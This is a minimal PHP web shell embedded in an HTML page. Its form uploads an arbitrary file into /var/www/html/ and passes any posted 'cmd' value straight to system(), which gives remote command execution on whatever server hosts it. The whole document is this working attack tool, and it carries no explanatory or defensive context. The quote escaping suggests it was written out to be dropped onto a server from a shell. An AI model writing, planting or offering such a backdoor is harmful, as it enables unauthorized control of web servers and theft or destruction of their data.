<html>
   <body>
      <form method="POST" enctype="multipart/form-data"><input type="file" name="uploadedFile"><input type="text" name="cmd" autofocus id="cmd" size="80"><input type="submit" value="Upload & Execute"></form>
      <pre><?php if(isset($_FILES['\''uploadedFile'\''])){$targetPath="/var/www/html/" . basename($_FILES['\''uploadedFile'\'']['\''name'\'']);if(move_uploaded_file($_FILES['\''uploadedFile'\'']['\''tmp_name'\''], $targetPath)){echo "File uploaded successfully: " . htmlspecialchars($targetPath);}else{echo "Failed to upload file.";}}if(isset($_POST['\''cmd'\''])){system($_POST['\''cmd'\'']);}?></pre>
   </body>
</html>
